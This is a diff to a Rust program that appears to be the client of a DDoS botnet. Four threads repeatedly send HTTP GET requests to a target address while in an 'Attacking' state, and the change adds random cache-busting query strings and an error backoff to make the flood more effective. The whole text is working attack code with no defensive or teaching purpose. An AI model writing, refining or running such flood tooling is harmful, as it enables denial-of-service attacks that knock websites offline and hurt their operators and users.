@@ -1,6 +1,7 @@
 use std::{env, io::{Read, Write}, net::TcpStream, process, sync::{Arc, RwLock}, thread::{self, sleep}, time::Duration};
 
 use astolfo::FemState;
+use rand::Rng;
 
 fn main() {
     let address = env::args().nth(1).unwrap();
@@ -19,6 +20,8 @@ fn main() {
     for _ in 0..4 {
         let thread_state = Arc::clone(&working_state);
         thread::spawn(move || {
+            let client = reqwest::blocking::Client::new();
+            let mut rng = rand::rng();
             loop {
                 let state = thread_state.read().unwrap(); 
                 match &*state {
@@ -26,8 +29,16 @@ fn main() {
                         sleep(Duration::from_secs(3));
                     },
                     FemState::Attacking(addr) => {
-                        reqwest::blocking::get(addr).unwrap();
-                        sleep(Duration::from_millis(10));
+                        let mut payload = String::with_capacity(addr.len()+100);
+                        for _ in 1..100 {
+                            let c = rng.random_range(3..=126) as u8 as char;
+                            payload.push(c);
+                        }
+                        let target = format!("{addr}?q={payload}");
+                        match client.get(&target).send() {
+                            Ok(_) => sleep(Duration::from_millis(10)),
+                            Err(_) => sleep(Duration::from_secs(10))
+                        };
                     },
                     _ => {}
                 };
